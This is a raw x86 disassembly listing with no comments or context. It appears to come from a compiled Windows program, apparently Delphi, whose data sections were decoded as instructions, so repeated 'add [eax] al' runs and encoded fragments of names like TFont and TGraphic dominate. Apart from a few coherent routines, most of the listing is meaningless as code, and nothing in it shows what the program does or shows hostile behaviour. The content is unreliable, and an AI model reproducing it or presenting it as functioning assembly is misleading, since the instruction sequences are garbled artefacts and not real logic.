add [ eax - 0x4a ] ch
inc edi
add [ ebx - 0x1 ] bl
add [ eax ] al
push 0x5c0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebp - 0x1 ] bl
add [ eax ] al
push 0x5e0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi - 0x1 ] bl
add [ eax ] al
push 0x400047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx - 0x1 ] al
add [ eax ] al
push 0x420047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx - 0x1 ] al
add [ eax ] al
push 0x440047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebp - 0x1 ] al
add [ eax ] al
push 0x460047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi - 0x1 ] al
add [ eax ] al
push 0x480047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx - 0x1 ] cl
add [ eax ] al
push 0x4a0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx - 0x1 ] cl
add [ eax ] al
push 0x4c0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebp - 0x1 ] cl
add [ eax ] al
push 0x4e0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi - 0x1 ] cl
add [ eax ] al
push 0x300047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx ] dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edx ] dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx ] dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi + edi * 8 ] dh
add [ eax ] al
push 0x350047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ esi ] dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi ] dh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ eax ] bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx ] bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edx ] bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx ] bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi + edi * 8 ] bh
add [ eax ] al
push 0x3d0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ esi ] bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi ] bh
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ eax ] ah
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx ] ah
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edx ] ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_421ec5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421ecc
retn
sub_421ed8
fcomp [ esi ]
inc edx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
cmp al 0x1f
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx ] bh
inc edx
add [ eax + eax ] cl
add [ eax ] al
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00421f ] bl
add [ eax ] al
add [ ecx + esi * 2 + 0x40 ] ah
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax + 0x421f ] bx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
popad
insd
nop
or al 0x20
inc edx
add [ ecx ] al
or al 0x54
inc esi
push esp
je r-xdata
imul esp [ ebx + 0x4f ] 0x61726570
jae r-xdata
outsb
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
mov eax 0x300421f
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add ah dh
and [ edx ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
sub [ eax ] ah
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ edi + ebx + 0x66090042 ] dh
jo r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
pop es
jb r-xdata
insd
push edi
push 0x5657469
jo r-xdata
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
and [ edx ] al
mov eax eax
nop
and [ edx ] al
add ecx [ ecx ]
push esp
push eax
outsb
push ebx
je r-xdata
and al 0x20
inc edx
add [ ebx + 0x422090c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] ah
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
outsd
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x2078c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + 0x70070042 ] cl
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
inc eax
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
add [ eax + 0x8004034 ] ch
inc edx
add [ eax ] bl
add [ eax ] al
add al ch
pop esi
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
jae r-xdata
popad
jae r-xdata
push es
jo r-xdata
insd
outsd
jo r-xdata
mov eax eax
mov ah 0x21
inc edi
jb r-xdata
jb r-xdata
inc ebx
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
mov al [ 0x4222 ]
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x4220f890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x228c0042 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4222 ] ah
jae r-xdata
shl [ ecx + 0xb030042 ] 0x54
inc edx
jb r-xdata
push 0x8b736369
push eax
outsb
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
inc edx
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
and al 0x20
popad
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
jo r-xdata
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
outsb
je r-xdata
push esp
inc edi
jb r-xdata
xor al 0x42
add [ edi ] cl
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
imul esp [ ebx + 0x73 ] 0x21b4c08b
or [ eax + 0x6d ] esi
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x7004221 ] dh
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
dec ebp
push eax
outsb
insb
jo r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x421ffc90
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
add [ eax ] al
enter 0x4222 0x0
imul esp [ ebx + 0x73 ] 0xffff0001
nop
dec esp
and eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
and eax [ edx ]
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + 0x22 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] ah
mov eax [ ecx ]
xor [ ecx + eax * 2 + 0x418c3800 ] cl
add [ ebx + ecx * 4 + 0x41 ] cl
add [ edx + 0x180042 ] cl
insb
nop
inc edi
js r-xdata
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
dec [ eax + 0xf004234 ]
jo r-xdata
dec ebp
popad
jae r-xdata
dec eax
and eax [ edx ]
pop es
add eax 0x6e6f4654
je r-xdata
and [ eax ] al
add [ eax ] al
add [ eax ] eax
std
inc eax
aaa
inc edx
add [ 0x6e6f4654 ] al
je r-xdata
xor al 0x40
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x30004237 ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x23 ] ch
inc edx
add [ edx + 0x23 ] dh
jl r-xdata
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + edi * 2 + 0x22 ] si
inc edx
add [ edi + ebx * 2 + 0x41 ] bl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
call 0xffffffffa04263b7
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
sbb [ eax ] al
dec ebp
jb r-xdata
add [ ebx ] al
outsb
popad
imul esp [ ebx + 0x73 ] 0x42227890
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ esp + edi - 0x73cfffbe ] dh
inc ecx
add [ eax ] bh
mov [ ecx ] es
fdivr [ edx + eax * 2 ]
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
loopne r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
and al 0x42
add [ eax + eax ] bl
add [ eax ] al
sub al 0x22
inc edx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
add [ eax + 0x43050001 ] al
outsd
insb
outsd
and eax [ edx ]
pushfd
and al [ edx ]
pop es
add [ eax ] cl
inc edi
jb r-xdata
jb r-xdata
jo r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
add [ esi + edi ] al
inc edx
add [ edi ] al
add al 0x54
push eax
outsb
enter 0x4224 0x0
pushfd
and al [ edx ]
add al 0x0
or [ edi + 0x72 ] al
popad
jo r-xdata
add eax 0x63746950
push r-xdata
pushfd
cmp eax [ edx ]
mov eax 0x423b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
fdivr [ ebx ]
inc edx
add ah ah
cmp eax [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ 0x6c797453 ] al
lea eax [ eax ]
enter 0x4224 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax + eax ] al
imul esp [ gs : edi + 0x68 ] 0x421ff874
adc [ eax ] al
clc
cmp al [ edx ]
add [ ebx ] bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
add al [ eax ]
push es
jo r-xdata
mov [ ecx ] es
cmp [ ecx + eax * 2 + 0x4237dc00 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al cl
and al [ edx ]
xor al [ eax ]
cwde
aaa
inc edx
add [ eax ] dh
inc edx
add [ eax + eax ] ah
add [ eax ] al
sub al 0x22
inc edx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
and al [ edx ]
mov al [ 0xffffffffac004034 ]
imul esp [ ebx + 0x73 ] 0xc08b0000
int3
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ 0x6f6c6f43 ] al
and [ edx ] al
sbb [ eax ] al
add bh bh
les edi [ esi ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 - 0x739a9b91 ] al
and [ edx ] al
fdivr [ esi ]
inc edx
add al ah
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
push esp
adc [ eax ] al
or [ edi ] bh
inc edx
add [ eax ] dl
aas
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x25c8c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
and eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x25
inc edx
add [ eax ] bl
add [ eax ] al
add [ edx ] ch
inc edx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ edi + edi + 0x42 ] bh
add [ eax ] dh
mov [ ecx ] es
cmp [ ecx + eax * 2 + 0x423fa400 ] cl
add [ esi ] al
push esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
imul esp [ ebx + 0x73 ] 0x1ed80004
inc edx
add ah bh
cmp eax 0x3e040042
add [ eax ] ch
cmp eax [ edx ]
inc eax
cmp eax [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
popad
insd
mov ah 0x1f
inc edx
add [ eax ] dl
cmp al 0x42
add [ eax ] bl
cmp al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
clc
pop ds
inc edx
imul esp [ ebx + 0x73 ] 0x20080007
inc edx
add [ eax + 0x3c ] al
inc edx
add [ eax + 0x3c ] cl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
add [ eax ] al
jae r-xdata
jb r-xdata
push ds
inc edx
add [ eax ] bl
add [ eax ] al
[ eax ]
cmp [ edx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
add eax 0x6f6c6f43
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4226 ] dh
nop
loopne r-xdata
add al 0x24
retn
outsd
js r-xdata
add [ eax ] al
add [ esi + r--data ] ah
inc edx
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
inc edx
add ah ah
inc eax
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
inc edx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
add bh bh
push eax
dec edx
inc edx
add [ eax + eax ] cl
add bh bh
inc eax
dec edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
inc edx
jb r-xdata
inc ecx
add [ edi + edi + 0x54060042 ] ah
and [ edx ] eax
clc
inc ecx
inc edx
add [ eax ] al
inc edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
mov [ esi ] fs
inc edx
add [ eax ] al
jae r-xdata
dec ebp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
int3
and al 0x42
add [ eax ] dl
add [ eax ] al
call [ eax + 0x4a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ edi + ebx * 2 + 0x41 ] bl
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
mov al 0x26
inc edx
add [ eax ] al
enter 0x4225 0x0
pushfd
and al [ edx ]
add al [ eax ]
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x25dc0004
inc edx
add [ eax + eax ] dl
add bh bh
pop esp
dec edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
add [ eax ] al
call 0xffffffffa04267cb
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add al bh
inc edx
inc edx
add [ eax ] dh
mov [ ecx ] es
cmp [ ecx + eax * 2 + 0x418b4c00 ] cl
add [ esp + ecx * 2 + 0x42 ] bh
add [ eax + 0x4c ] ch
inc edx
add [ ebx + ecx * 2 + 0x54070042 ] bl
inc ebx
popad
outsb
jbe r-xdata
movsb [ edi ] [ esi ]
inc edx
add [ eax ] bl
imul esp [ ebx + 0x73 ] 0x1ed80002
inc edx
add ah bl
inc eax
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
add al 0xdc
jmp sub_418d60
sub_4227c8
mov [ 0x4227 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp + 0x42 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc eax
add [ eax ] ah
mov eax [ ecx ]
xor [ ecx + eax * 2 + 0x42611c00 ] cl
add [ ebx + ecx * 4 + 0x41 ] cl
add [ eax - 0x53ffbe73 ] al
pushad
inc edx
add [ edx + ebp + 0x61680040 ] ch
inc edx
add [ edx + ebp + 0x2aac0040 ] ch
inc eax
add [ eax - 0x4bffbd9e ] dh
bound eax [ edx ]
lodsb [ esi ]
sub al [ eax ]
xor al 0x63
inc edx
add [ edx + ebp + 0x63980040 ] ch
inc edx
add [ ebx + 0x2aac0042 ] bl
inc eax
add [ ebx + 0x60740042 ] ch
inc edx
add [ eax + 0x40004262 ] bh
arpl [ edx ] ax
lodsb [ esi ]
sub al [ eax ]
lodsb [ esi ]
sub al [ eax ]
lodsb [ esi ]
sub al [ eax ]
lodsb [ esi ]
sub al [ eax ]
add [ eax ] eax
std
dec [ ebx ]
inc edx
add [ eax ] cl
push esp
inc edi
jb r-xdata
inc edx
add [ eax + ebp + 0x42 ] bh
add [ eax ] ch
add [ eax ] al
add al bl
pop edi
inc ecx
add [ eax - 0xfffbfcc ] ah
mov [ ecx ] es
mov al 0x34
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
jo r-xdata
add [ eax ] al
lodsb [ esi ]
sub [ edx ] al
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
add [ eax ] cl
imul esp [ ebx - 0x73 ] 0x288c0040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
mov al [ edx ]
cmp [ edx + eax * 2 ] bh
mov al [ 0x2800428a ]
js r-xdata
add [ eax + 0x61 ] ch
inc edx
add ah al
ja r-xdata
push ebx
push 0x64657261
dec ecx
or al 0x54
imul esp [ ebx + 0x10 ] 0x5c004228
pushad
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x5bffbd88 ] cl
test [ edx ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x422a3470
add [ edi ] al
mov al [ edx ]
sub [ eax + 0x42 ] bh
add [ eax + 0x78 ] bh
inc edx
add [ eax - 0x4bffbd88 ] bh
bound eax [ edx ]
adc al 0x79
inc edx
add al ah
jge r-xdata
insd
popad
lea eax [ bx + si ]
pop eax
sub [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
sub [ edx ] eax
je r-xdata
jo r-xdata
inc eax
add [ esp + ebp + 0x42 ] cl
add [ eax ] dl
push esp
push edx
jo r-xdata
popad
nop
cld
sub al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
sub eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
sub eax [ edx ]
xor al 0x0
jo r-xdata
insd
popad
jo r-xdata
add ah bl
test [ edx ] eax
mov al 0x86
inc edx
add [ ebx - 0x787bffbe ] bl
inc edx
add al bl
xchg [ edx ] eax
sbb [ edx + 0x42 ] dh
add [ eax + 0x40004262 ] bh
arpl [ edx ] ax
mov esp 0x9800427c
xor al [ eax ]
and al 0x32
inc eax
add [ edi + 0x67f00042 ] dl
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
mov eax 0x4229
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
sub al [ edx ]
cmp al 0x0
add [ eax ] al
les esp [ edi ]
inc edx
add [ eax - 0xfffbfcc ] ah
mov [ ecx ] es
mov al 0x34
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x30004272 ] al
mov [ ecx ] es
sbb al 0x61
inc edx
add [ edx + esi * 2 - 0x727fffbe ] bh
inc ecx
add [ eax + 0x10004274 ] dl
jne r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x42 ] bl
add [ eax + eax ] dh
add [ eax + ebp + 0x34a00042 ] ch
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ edx + ebp + 0x540c0040 ] ch
imul esp [ ebx + 0x73 ] 0xf8900000
sub [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sub [ edx ] al
or [ eax ] al
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor eax 0xdb84fffe
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
add [ eax ] al
les esp [ edi ]
inc edx
add [ eax - 0xfffbfcc ] ah
mov [ ecx ] es
mov al 0x34
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add ah bl
mov eax [ edx ]
xor [ ecx + eax * 2 + 0x42611c00 ] cl
add [ esp + ecx * 4 ] cl
inc edx
add [ eax - 0x53ffbe73 ] al
pushad
inc edx
add [ esp + ecx * 4 + 0x42 ] ch
add [ eax + 0x61 ] ch
inc edx
add [ esp + ecx * 4 - 0x7327ffbe ] ch
inc edx
add [ eax - 0x4bffbd9e ] dh
bound eax [ edx ]
in al dx
mov [ edx ] es
xor al 0x63
inc edx
add [ eax - 0x71 ] dh
inc edx
add [ eax - 0x77ffbd9d ] bl
pop [ edx ]
mov [ edi + 0x63ac0042 ] cs
inc edx
add [ eax - 0x47ffbd75 ] cl
bound eax [ edx ]
inc eax
arpl [ edx ] ax
sub al 0x8e
inc edx
add [ edi + ecx * 4 - 0x7033ffbe ] ah
inc edx
add al ah
pop [ edx ]
add eax 0x6f634954
outsb
mov eax eax
insb
sub eax [ edx ]
pop es
